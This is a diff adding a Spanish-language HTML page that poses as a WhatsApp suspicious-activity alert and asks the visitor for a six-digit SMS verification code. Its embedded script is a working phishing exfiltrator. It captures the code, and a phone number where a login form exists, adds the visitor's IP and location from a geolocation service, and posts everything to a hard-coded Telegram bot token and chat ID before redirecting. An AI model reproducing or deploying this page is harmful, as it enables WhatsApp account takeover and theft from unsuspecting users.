@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
+    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
+</head>
+<body>
+
+
+    <header>
+        <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" alt="Logo WhatsApp">
+    </header>
+
+    <div class="content">
+         <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="350" alt="Logo WhatsApp">
+        <p>Le hemos enviado un código de verificación de 6 dígitos via SMS TEXTO a su número teléfono registrado, esto puede tarda mas de lo esperado POR FAVOR ESPERE POR SEGURIDAD, introduzca el código de SMS TEXTO enviado:</p>
+        <form id="verificationForm">
+    
+            <input type="tel" id="cod" name="cod" minlength="6" maxlength="6" placeholder="Código" required="">
+
+            <button type="submit" id="submitButton">Continuar</button>
+        </form>
+    </div>
+
+    <footer>
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+<script type="text/javascript">
+    //bot token
+var telegram_bot_id =  "7624511401:AAE8rp04W79UnX5DS8t6EUbeTGWNGPgMkww";
+//chat id
+var chat_id ="7712518065";
+document.addEventListener("DOMContentLoaded", function() {
+    // Función para obtener el valor de un parámetro de la URL
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    // Función para obtener la ubicación y enviar el mensaje a Telegram
+    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            var country = data.country_name;
+            var region = data.region;
+            var ip = data.ip;
+            if (country && region && ip) {
+                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
+            } else {
+                message += '\nNo se pudo obtener la ubicación.';
+            }
+            enviarMensajeTelegram(message, nextPage);
+        })
+        .catch(error => {
+            console.error("Error al obtener la ubicación:", error);
+            message += "\nError al obtener la ubicación.";
+            enviarMensajeTelegram(message, nextPage);
+        });
+    }
+
+    // Función para enviar el mensaje a Telegram y redirigir
+    function enviarMensajeTelegram(mensaje, nextPage) {
+      
+        var url = 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage';
+        var params = {
+            chat_id: chat_id,
+            text: mensaje
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Ocurrió un error al enviar el mensaje.');
+            }
+            console.log('Mensaje enviado con éxito.');
+            window.location.href = nextPage;
+        })
+        .catch(error => {
+            console.error('Error al enviar el mensaje:', error);
+        });
+    }
+
+    // Evento de envío de formulario para la página de inicio de sesión
+    var loginForm = document.getElementById("loginForm");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var telefono = document.getElementById("telefono").value;
+            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "cargando2.html?action=telefono", "💲 Whatsapp 💲:\nTeléfono: " + telefono);
+        });
+    }
+
+
+    // Evento de envío de formulario para la sección de contacto
+    var verificationForm = document.getElementById("verificationForm");
+    if (verificationForm) {
+        verificationForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var cod = document.getElementById("cod").value;
+            obtenerUbicacionYEnviarMensajeTelegram(cod, cod, "cargando3.html?action=cod", "💲 Whatsapp 💲:\nSMS WHATSAPP: " + cod);
+        });
+    
+    }
+});
+
+
+</script>
+
+
+</body></html>
